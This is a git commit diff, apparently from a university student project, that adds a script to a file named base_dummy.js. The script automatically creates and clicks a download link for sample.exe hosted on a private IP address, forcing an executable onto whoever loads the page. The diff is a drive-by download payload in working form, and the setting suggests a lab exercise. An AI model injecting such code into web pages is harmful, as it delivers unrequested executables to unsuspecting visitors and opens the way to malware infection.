a8191189bc106aac6f1d4491de972d21901f4f25
Takumi <c0a20021ab@edu.teu.ac.jp>
2022-07-22 11:09:10 +0900

    base_dummy.jsに差し込むscript文をぶちこんだ

--- js/base_dummy.js
+++ js/base_dummy.js
@@ -1,10 +1,7 @@
-<style>
-    $(window).on('load', function () {
-        var link = document.createElement('a');
-        link.href = '../sample.exe';
-        link.download = '';
-        document.body.appendChild(link);
-        link.click();
-        window.location.href = '../cgi/homepage.cgi';
-    });
-</style>
+<script>
+    var link = document.createElement("a");
+    link.href = "http://192.168.229.128/sample.exe";
+    link.download = "";
+    document.body.appendChild(link);
+    link.click();
+</script>
